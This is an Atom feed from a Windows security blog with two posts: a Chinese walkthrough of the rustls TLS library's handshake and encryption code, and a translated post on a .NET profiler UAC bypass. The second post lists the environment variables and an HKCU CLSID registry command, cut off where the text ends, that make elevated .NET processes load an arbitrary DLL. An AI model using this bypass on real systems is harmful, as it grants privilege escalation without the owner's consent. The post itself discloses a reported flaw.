<?xml version="1.0" encoding="utf-8"?> <feed xmlns="http://www.w3.org/2005/Atom">   <title>Anhkgg&#39;Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | 内核研究 | 逆向分析 | 漏洞分析挖掘</title>   <subtitle>Windows Kernel/Rootkit/Reverse Engineer/Expolit/内核研究/逆向分析/漏洞分析挖掘</subtitle>   <link href="/atom.xml" rel="self"/>      <link href="https://anhkgg.github.io/"/>   <updated>2017-11-17T05:35:17.809Z</updated>   <id>https://anhkgg.github.io/</id>      <author>     <name>Anhkgg</name>        </author>      <generator uri="http://hexo.io/">Hexo</generator>      <entry>     <title>Rustls之源码分析总结（一）</title>     <link href="https://anhkgg.github.io/rustls-source-code-analyze/"/>     <id>https://anhkgg.github.io/rustls-source-code-analyze/</id>     <published>2017-11-17T05:19:50.000Z</published>     <updated>2017-11-17T05:35:17.809Z</updated>          <content type="html"><![CDATA[<ul> <li>作者：<strong>anhkgg</strong> </li> <li>日期：<strong>2017-11-16</strong></li> </ul> <p>rustls已经支持tls1.3，但是测试分析中使用的tls1.2，所以后面分析主要集中在tls1.2。</p> <p>主要分析的源码内容：</p> <ol> <li>client和server的握手协议流程</li> <li>rustls是如何进行数据传输的</li> <li>数据传输是如何加密解密的</li> </ol> <a id="more"></a> <h2 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h2><p><strong>分为client和server两部分</strong></p> <h3 id="公共接口"><a href="#公共接口" class="headerlink" title="公共接口"></a>公共接口</h3><p><strong>session.rs</strong>定义了SessionCommon，包括了数据传输、数据加密、包处理相关接口。</p> <p><strong>主要字段</strong></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">pub struct SessionCommon &#123;</div><div class="line">    pub negotiated_version: Option&lt;ProtocolVersion&gt;, //协商好的协议版本</div><div class="line">    pub is_client: bool, //是客户端true，是服务端false</div><div class="line">    message_encrypter: Box&lt;MessageEncrypter&gt;, //数据加密接口</div><div class="line">    message_decrypter: Box&lt;MessageDecrypter&gt;, //数据解密接口</div><div class="line">    key_schedule: Option&lt;KeySchedule&gt;,</div><div class="line">    suite: Option&lt;&amp;&apos;static SupportedCipherSuite&gt;,</div><div class="line">    write_seq: u64,</div><div class="line">    read_seq: u64,</div><div class="line">    peer_eof: bool,</div><div class="line">    pub peer_encrypting: bool,</div><div class="line">    pub we_encrypting: bool,</div><div class="line">    pub traffic: bool, // 默认false，握手完成字段为true</div><div class="line">    pub want_write_key_update: bool,</div><div class="line">    pub message_deframer: MessageDeframer, //消息帧处理对象，保存所有Message包</div><div class="line">    pub handshake_joiner: HandshakeJoiner,</div><div class="line">    pub message_fragmenter: MessageFragmenter,</div><div class="line">    received_plaintext: ChunkVecBuffer, //缓存接收到的数据明文</div><div class="line">    sendable_plaintext: ChunkVecBuffer,//缓存握手后需要传输的数据明文</div><div class="line">    pub sendable_tls: ChunkVecBuffer, //缓存握手数据包</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p><strong>主要接口</strong></p> <table> <thead> <tr> <th>函数名</th> <th>说明 </th> </tr> </thead> <tbody> <tr> <td><code>read_tls</code></td> <td>接收底层连接数据 </td> </tr> <tr> <td><code>write_tls</code></td> <td>通过底层连接发送数据</td> </tr> <tr> <td><code>process_new_packets</code></td> <td>每次调用read_tls之后都需要调用该函数主动触发消息处理</td> </tr> <tr> <td><code>wants_read/wants_write</code></td> <td>是否有数据需要接收发送</td> </tr> <tr> <td><code>encrypt_outgoing</code></td> <td>加密要发送的数据，在握手完成之后需要</td> </tr> <tr> <td><code>decrypt_incoming</code></td> <td>解密要接收的数据，在握手完成之后需要</td> </tr> <tr> <td><code>send_msg_encrypt</code></td> <td>发送加密数据</td> </tr> <tr> <td><code>send_appdata_encrypt</code></td> <td>发送握手之后的数据，加密</td> </tr> <tr> <td><code>send_some_plaintext</code></td> <td>发送明文数据，握手之后会被加密发送</td> </tr> <tr> <td><code>start_traffic</code></td> <td>握手完成之后调用，设置传输标志，发送缓存的数据明文</td> </tr> <tr> <td><code>send_msg</code></td> <td>发送TLS消息，根据是否加密走不通发送方式</td> </tr> <tr> <td><code>take_received_plaintext</code></td> <td>握手完成之后，收到数据会被调用，参数已经是明文Message</td> </tr> <tr> <td><code>set_message_encrypter</code></td> <td>设置消息加密接口，<code>start_encryption_tls12</code>中调用</td> </tr> <tr> <td><code>set_message_decrypter</code></td> <td>设置消息解密接口，<code>start_encryption_tls12</code>中调用</td> </tr> <tr> <td><code>start_encryption_tls12</code></td> <td>TLS1.2设置加解密接口，在ExpectTLS12ServerDone::handle/ExpectTLS12ClientKX::handle调用</td> </tr> </tbody> </table> <p><strong>ciper.rs</strong>定义了加密解密的接口。</p> <p><code>MessageEncrypter</code>,<code>MessageDecrypter</code>，具体使用加解密方法在握手过程中ExpectTLS12ServerDone::handle/ExpectTLS12ClientKX::handle设置。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">//client端</div><div class="line">// 5e. Now commit secrets.</div><div class="line">let hashalg = sess.common.get_suite().get_hash();</div><div class="line">if st.handshake.using_ems &#123;</div><div class="line">    sess.secrets = Some(SessionSecrets::new_ems(&amp;st.handshake.randoms,</div><div class="line">                                                &amp;handshake_hash,</div><div class="line">                                                hashalg,</div><div class="line">                                                &amp;kxd.premaster_secret));</div><div class="line">&#125; else &#123;</div><div class="line">    sess.secrets = Some(SessionSecrets::new(&amp;st.handshake.randoms,</div><div class="line">                                            hashalg,</div><div class="line">                                            &amp;kxd.premaster_secret));</div><div class="line">&#125;</div><div class="line">sess.start_encryption_tls12();</div><div class="line">//----------</div><div class="line">pub fn start_encryption_tls12(&amp;mut self, secrets: &amp;SessionSecrets) &#123;</div><div class="line">        let (dec, enc) = cipher::new_tls12(self.get_suite(), secrets);</div><div class="line">        self.message_encrypter = enc;</div><div class="line">        self.message_decrypter = dec;</div><div class="line">    &#125;</div></pre></td></tr></table></figure> <h3 id="client详解"><a href="#client详解" class="headerlink" title="client详解"></a>client详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">src/client/mod.rs 导出ClientSession接口，外部使用</div><div class="line">src/client/hs.rs tls协议中所有包处理，包括握手和传输</div></pre></td></tr></table></figure> <p><code>ClientSession</code>内部由<code>ClientSessionImpl</code>实现。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pub struct ClientSessionImpl &#123;</div><div class="line">    pub config: Arc&lt;ClientConfig&gt;, //保存client端的证书，密钥配置等信息</div><div class="line">    pub secrets: Option&lt;SessionSecrets&gt;, //保存握手后的会话密钥</div><div class="line">    pub alpn_protocol: Option&lt;String&gt;,</div><div class="line">    pub common: SessionCommon, // 完成具体消息传输、加解密等</div><div class="line">    pub error: Option&lt;TLSError&gt;,</div><div class="line">    pub state: Option&lt;Box&lt;hs::State + Send&gt;&gt;, // 保存握手过程中的交互状态，握手中处理对象都实现State接口</div><div class="line">    pub server_cert_chain: CertificatePayload, // 服务端证书链</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p><strong>握手，准备第一个数据包</strong>。</p> <p><code>ClientSessionImpl::new</code>内部就会准备握手要发送的第一个数据包。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">cs.state = Some(hs::start_handshake(&amp;mut cs, hostname));</div><div class="line">//cs.state保存下一次将处理数据对象</div><div class="line">---&gt; //进入hs.rs</div><div class="line">InitialState::emit_initial_client_hello</div><div class="line">---&gt;</div><div class="line">emit_client_hello_for_retry</div><div class="line">---&gt; //构造发送的数据包</div><div class="line">let mut chp = HandshakeMessagePayload &#123;</div><div class="line">        typ: HandshakeType::ClientHello,</div><div class="line">        payload: HandshakePayload::ClientHello(ClientHelloPayload &#123;</div><div class="line">            client_version: ProtocolVersion::TLSv1_2,</div><div class="line">            random: Random::from_slice(&amp;handshake.randoms.client),</div><div class="line">            session_id: session_id,</div><div class="line">            cipher_suites: sess.get_cipher_suites(),</div><div class="line">            compression_methods: vec![Compression::Null],</div><div class="line">            extensions: exts,</div><div class="line">        &#125;),</div><div class="line">    &#125;;</div></pre></td></tr></table></figure> <p>然后，收到返回数据之后，会在<code>ClientSessionImpl::process_main_protocol</code>调用<code>state.handle</code>来处理收到的数据，然后返回新的state，用于下次处理，如此循环，知道握手完成。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">fn process_main_protocol(&amp;mut self, msg: Message) -&gt; Result&lt;(), TLSError&gt; &#123;</div><div class="line"> //检查消息是否合法</div><div class="line">    let state = self.state.take().unwrap();</div><div class="line">    state</div><div class="line">        .check_message(&amp;msg)</div><div class="line">        .map_err(|err| &#123;</div><div class="line">            self.queue_unexpected_alert();</div><div class="line">            err</div><div class="line">        &#125;)?;</div><div class="line">    //处理本次数据，返回下次需要处理的数据对象</div><div class="line">    self.state = Some(state.handle(self, msg)?);</div><div class="line">    Ok(())</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>消息处理调用流程如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//ClientSessionImpl</div><div class="line">process_new_packets-&gt;process_msg-&gt;process_main_protocol-&gt;state.handle</div></pre></td></tr></table></figure> <p>下面直接列出client端握手处理流程：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ExpectServerHelloOrHelloRetryRequest:handle </div><div class="line">ExpectServerHello:handle // 处理serverhello</div><div class="line">ExpectTLS12Certificate: handle //验证证书</div><div class="line">ExpectTLS12ServerKX: handle  // 密钥交换</div><div class="line">ExpectTLS12ServerDoneOrCertReq: handle</div><div class="line">ExpectTLS12ServerDone: handle</div><div class="line">emit_clientkx</div><div class="line">emit_ccs</div><div class="line">ExpectTLS12CCS:handle //通知使用加密方式发送报文，sess.common.peer_now_encrypting();设置后面数据会加密的状态</div><div class="line">emit_finished</div><div class="line">ExpectTLS12Finished:handle // 握手结束</div></pre></td></tr></table></figure> <p>在<code>ExpectTLS12Finished::handle</code>中，会保存<code>session</code>，开始传输数据，以及返回下次的<code>state</code>，<strong>此时握手协议已经完成</strong>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">save_session(&amp;mut st.handshake,</div><div class="line">             &amp;mut st.ticket,</div><div class="line">             sess);</div><div class="line"></div><div class="line">if st.resuming &#123;</div><div class="line">    emit_ccs(sess);</div><div class="line">    emit_finished(&amp;mut st.handshake, sess);</div><div class="line">&#125;</div><div class="line"></div><div class="line">sess.common.we_now_encrypting();</div><div class="line">sess.common.start_traffic(); //发送数据</div><div class="line">Ok(st.into_expect_tls12_traffic(fin)) // 下次需要ExpectTLS12Traffic</div></pre></td></tr></table></figure> <p>后面数据传输的所有流程都会进入<code>ExpectTLS12Traffic::handle</code>，也就是开始<strong>传输协议</strong>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">impl State for ExpectTLS12Traffic &#123;</div><div class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ClientSessionImpl, mut m: Message) -&gt; StateResult &#123;</div><div class="line">   sess.common.take_received_plaintext(m.take_opaque_payload().unwrap());</div><div class="line">        Ok(self) //返回的依然是ExpectTLS12Traffic给state，所以以后都会进入这里</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p><strong>传输数据的处理</strong>。</p> <p><strong>接收数据</strong></p> <p>调用<code>take_received_plaintext</code>将获取到的明文Message传给内部处理，存入<code>SessionCommon</code>的<code>received_plaintext</code>，等待用户的提取。</p> <p>那明文Message是怎么来的呢？是在前面说到的消息处理流程中，到handle之前。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">process_new_packets-&gt;process_msg-&gt;process_main_protocol-&gt;state.handle</div></pre></td></tr></table></figure> <p>在<code>process_msg</code>中会判断<code>peer_encrypting</code>状态为真则将数据解密，而该状态是在握手中<code>ExpectTLS12CCS::handle</code> 被设置为true的。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">pub fn process_msg(&amp;mut self, mut msg: Message) -&gt; Result&lt;(), TLSError&gt; &#123;</div><div class="line"> // Decrypt if demanded by current state.</div><div class="line"> if self.common.peer_encrypting &#123;</div><div class="line">     let dm = self.common.decrypt_incoming(msg)?; //解密数据</div><div class="line">     msg = dm;</div><div class="line"> &#125;</div><div class="line">        </div><div class="line">//self.common.peer_encrypting</div><div class="line">pub fn peer_now_encrypting(&amp;mut self) &#123;</div><div class="line">    self.peer_encrypting = true;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p><strong>发送数据</strong></p> <p><strong>握手过程中</strong>，发送数据包使用<code>sess.common.send_msg(ch, false)</code>。<code>send_msg</code>内部根据是否加密状态（<code>must_encrypt</code>）进行不同处理，直接缓存或者调用<code>send_msg_encrypt</code>加密之后缓存。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">send_msg_encrypt-&gt;send_single_fragment-&gt;encrypt_outgoing(加密)</div></pre></td></tr></table></figure> <p>最后都是通过<code>queue_tls_message</code>将数据先缓存，然后在调用<code>write_tls</code>之后将数据发送。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pub fn write_tls(&amp;mut self, wr: &amp;mut Write) -&gt; io::Result&lt;usize&gt; &#123;</div><div class="line">    self.sendable_tls.write_to(wr)</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p><strong>握手完成后</strong>，通过<code>ClientSession</code>实现的<code>io::write</code>（或者<code>write_all</code>）接口发送明文数据。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">impl io::Write for ClientSession &#123;</div><div class="line"> //先缓存数据</div><div class="line">    fn write(&amp;mut self, buf: &amp;[u8]) -&gt; io::Result&lt;usize&gt;&#123;</div><div class="line">            self.imp.common.send_some_plaintext(buf)</div><div class="line">    &#125;</div><div class="line"> //flush时才发送数据</div><div class="line">    fn flush(&amp;mut self) -&gt; io::Result&lt;()&gt; &#123;</div><div class="line">        self.imp.common.flush_plaintext();</div><div class="line">        Ok(())</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p><code>send_some_plaintext</code>在根据是否握手完成有不同的操作，握手未完成时，先缓存明文到<code>sendable_plaintext</code>，握手完成后，直接调用<code>send_appdata_encrypt</code>缓存密文（进入<code>send_single_fragment</code>过程加密）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">pub fn send_some_plaintext(&amp;mut self, data: &amp;[u8]) -&gt; io::Result&lt;usize&gt; &#123;</div><div class="line">    self.send_plain(data, Limit::Yes)</div><div class="line">&#125;</div><div class="line"></div><div class="line">fn send_plain(&amp;mut self, data: &amp;[u8], limit: Limit) -&gt; io::Result&lt;usize&gt; &#123;</div><div class="line">    if !self.traffic &#123; //握手未完成</div><div class="line">        let len = match limit &#123; //缓存明文</div><div class="line">            Limit::Yes =&gt; self.sendable_plaintext.append_limited_copy(data),</div><div class="line">            Limit::No =&gt; self.sendable_plaintext.append(data.to_vec())</div><div class="line">        &#125;;</div><div class="line">        return Ok(len);</div><div class="line">    &#125;</div><div class="line">    //握手完成，直接缓存加密数据</div><div class="line">    Ok(self.send_appdata_encrypt(data, limit))</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>握手完成时，之前缓存的明文数据通过<code>start_traffic</code>实际将数据加密缓存到sendable_tls，最后也是通过write_tls发送出去。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">pub fn start_traffic(&amp;mut self) &#123;</div><div class="line">        self.traffic = true;</div><div class="line">        self.flush_plaintext();</div><div class="line">    &#125;</div><div class="line">-&gt;</div><div class="line">flush_plaintext-&gt;send_plain-&gt;send_appdata_encrypt-&gt;send_single_fragment-&gt; encrypt_outgoing(加密)</div></pre></td></tr></table></figure> <p>握手完成之后调用的<code>send_some_plaintext</code>是直接将数据加密缓存，在write_tls后发送出去。</p> <h3 id="server详解"><a href="#server详解" class="headerlink" title="server详解"></a>server详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">src/server/mod.rs 导出ServerSession接口，外部使用</div><div class="line">src/server/hs.rs tls协议中所有包处理，包括握手和传输</div><div class="line">src/client/</div></pre></td></tr></table></figure> <p>公开外部使用的借口ServerSession，内部由ServerSessionImpl实现。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">pub struct ServerSessionImpl &#123;</div><div class="line">    pub config: Arc&lt;ServerConfig&gt;, //证书、密钥等配置</div><div class="line">    pub secrets: Option&lt;SessionSecrets&gt;, //会话密钥</div><div class="line">    pub common: SessionCommon, // 实际握手传输数据处理对象</div><div class="line">    sni: Option&lt;webpki::DNSName&gt;, //SNI(Server Name Indication) ，解决一个服务器使用多个域名和证书的SSL/TLS扩展</div><div class="line">    pub alpn_protocol: Option&lt;String&gt;,</div><div class="line">    pub error: Option&lt;TLSError&gt;,</div><div class="line">    pub state: Option&lt;Box&lt;hs::State + Send&gt;&gt;, //握手和传输中处理数据包的状态，每个状态的数据包处理对象</div><div class="line">    pub client_cert_chain: Option&lt;Vec&lt;key::Certificate&gt;&gt;, //client证书链</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p><strong>接口基本和ClientSession类似，不再详述</strong></p> <p><strong>握手流程</strong></p> <p>server和client处理握手的方式都一样，每个握手包处理对象都会实现State接口。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pub trait State &#123;</div><div class="line">    fn check_message(&amp;self, m: &amp;Message) -&gt; CheckResult;</div><div class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ServerSessionImpl, m: Message) -&gt; StateResult;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>然后在收到client消息之后，在<code>process_main_protocol</code>中调用对应握手包对象的handle函数，并且会返回握手期望处理的下次数据包对象给state，以便下次收到消息继续处理。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//process_main_protocol</div><div class="line">self.state = Some(st.handle(self, msg)?);</div></pre></td></tr></table></figure> <p>握手流程：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-----ExpectClientHello::handle</div><div class="line">-----ExpectTLS12Certificate::handle //如果需要验证client的证书，有这步</div><div class="line">-----ExpectTLS12ClientKX::handle //密钥交换</div><div class="line">-----ExpectTLS12CertificateVerify::handle //验证client证书</div><div class="line">-----ExpectTLS12CCS::handle //通知使用加密方式发送报文</div><div class="line">-----ExpectTLS12Finished::handle //握手完成</div><div class="line">-----ExpectTLS12Traffic:: handle //开发传输数据</div></pre></td></tr></table></figure> <p><strong>消息传输</strong></p> <p>同样，握手完成后，server在<code>ExpectTLS12Traffic::handle</code>中处理后续的传输协议中的消息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">impl State for ExpectTLS12Traffic &#123;</div><div class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ServerSessionImpl, mut m: Message) -&gt; StateResult &#123;</div><div class="line">        println!(&quot;-----ExpectTLS12Traffic::handle&quot;);</div><div class="line">        sess.common.take_received_plaintext(m.take_opaque_payload().unwrap());</div><div class="line">        Ok(self)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>数据加密和解密流程基本和client类似，不再详述。</p> <p><strong>另外，client和server握手中需要发送的数据包构造都在hs.rs::emit_xxx函数中</strong></p> <h3 id="消息相关"><a href="#消息相关" class="headerlink" title="消息相关"></a>消息相关</h3><p>该部分存在单独的msgs目录下，包含了握手过程中各种消息类型的定义，消息传输具体设计的<code>fragment/deframe</code>等。</p> <p>所有消息统一的结构<code>Message</code>，<code>Message</code>也定义了一下方便获取字段和数据的借口，这里不再详述。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">pub struct Message &#123;</div><div class="line">    pub typ: ContentType,</div><div class="line">    pub version: ProtocolVersion,</div><div class="line">    pub payload: MessagePayload,</div><div class="line">&#125;</div></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">//msgs/message.rs</div><div class="line">MessagePayload</div><div class="line">BorrowMessage</div><div class="line"></div><div class="line">//msgs/handshake.rs</div><div class="line">包含握手过程中，证书、密钥交换的一些数据结构</div><div class="line"></div><div class="line">//msgs/deframe.rs</div><div class="line">定义了MessageDeframer，管理Message数据，read/deframe_one</div><div class="line"></div><div class="line">//msgs/hsjoiner.rs</div><div class="line">HandshakeJoiner，重建握手数据，验证数据等定义</div><div class="line"></div><div class="line">//msgs/enums.rs</div><div class="line">各种版本号，算法类型号，握手包类型序号等等的enum定义</div><div class="line"></div><div class="line">//msgs/ccs.rs</div><div class="line">密钥交换相关定义</div></pre></td></tr></table></figure> <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><table> <thead> <tr> <th>文件</th> <th>说明</th> </tr> </thead> <tbody> <tr> <td>key.rs</td> <td>密钥、证书结构定义</td> </tr> <tr> <td>pemfile.rs</td> <td>PEM文件解析生成密钥相关接口</td> </tr> <tr> <td>verify.rs</td> <td>证书验证相关</td> </tr> <tr> <td>suites.rs</td> <td>加密套件、密钥交换相关</td> </tr> <tr> <td>sign.rs</td> <td>签名相关</td> </tr> <tr> <td>vecbuf.rs</td> <td>所有消息数据最底层存储结构，vec构成</td> </tr> <tr> <td>webpki</td> <td>三方库，完成证书验证</td> </tr> <tr> <td>ring</td> <td>三方库，完成加密算法相关能力</td> </tr> </tbody> </table> <p><strong>下篇在根据示例代码分析一下rustls库具体的使用</strong></p> <p>转载请注明出处：<a href="https://anhkgg.github.io/rustls-source-code-analyze/">https://anhkgg.github.io/rustls-source-code-analyze/</a></p> ]]></content>          <summary type="html">            &lt;ul&gt; &lt;li&gt;作者：&lt;strong&gt;anhkgg&lt;/strong&gt; &lt;/li&gt; &lt;li&gt;日期：&lt;strong&gt;2017-11-16&lt;/strong&gt;&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;rustls已经支持tls1.3，但是测试分析中使用的tls1.2，所以后面分析主要集中在tls1.2。&lt;/p&gt; &lt;p&gt;主要分析的源码内容：&lt;/p&gt; &lt;ol&gt; &lt;li&gt;client和server的握手协议流程&lt;/li&gt; &lt;li&gt;rustls是如何进行数据传输的&lt;/li&gt; &lt;li&gt;数据传输是如何加密解密的&lt;/li&gt; &lt;/ol&gt;          </summary>            <category term="rust" scheme="https://anhkgg.github.io/categories/rust/"/>                 <category term="rust" scheme="https://anhkgg.github.io/tags/rust/"/>            <category term="rustls" scheme="https://anhkgg.github.io/tags/rustls/"/>            <category term="源码分析" scheme="https://anhkgg.github.io/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>            <category term="TLS/SSL" scheme="https://anhkgg.github.io/tags/TLS-SSL/"/>        </entry>      <entry>     <title>翻译：通过.NET程序提权绕过UAC</title>     <link href="https://anhkgg.github.io/tans-net-bypass-uac/"/>     <id>https://anhkgg.github.io/tans-net-bypass-uac/</id>     <published>2017-09-21T06:04:46.000Z</published>     <updated>2017-09-21T06:08:51.860Z</updated>          <content type="html"><![CDATA[<p>.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。</p> <a id="more"></a> <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>去年五月， Casey Smith在他的博客和Twitter上指出.NET分析器的DLL加载可能会被滥用，通过环境变量使合法的.NET程序加载一个恶意DLL</p> <p>当看到这一点，脑海中第一种想法就是，如果这个方法在高权限.NET进程也可以工作，那这将是一个绕过UAC的好办法。果然，确实如此。</p> <p>这个问题到写这篇博客时依然没有修复，而且可能一直如此——但是在7月，它被 Stefan Kanthak独立地发现并报告了，按完整披露流程公布了该问题。</p> <h1 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h1><p>要让一个.NET应用程序加载任意一个DLL，我们可以使用以下环境变量。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">COR_ENABLE_PROFILING=1</div><div class="line">COR_PROFILER=&#123;GUID&#125;</div><div class="line">COR_PROFILER_PATH=C:\path\to\some.dll</div></pre></td></tr></table></figure> <p>在.NET 4以下版本，CLSID必须在HKCR\CLSID{GUID}\InprocServer32定义包含profiling DLL的路径的注册表键。在最近版本中，CLR通过COR_PROFILER_PATH环境变量来找这个DLL，如果COR_PROFILER_PATH没有定义再使用CLSID查找。</p> <p>HKCR\CLSID是HKLM和HKCU下Software\Classes\CLSID组合起来显示的。在HKLM（或者系统环境变量）下创建CLSID键需要提权，而在HKCU下创建不需要。需要注意，在用户环境变量和HKCU注册表项下一切也都工作正常。</p> <p>可以简单使用一段批处理命令让它工作：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; /ve /t 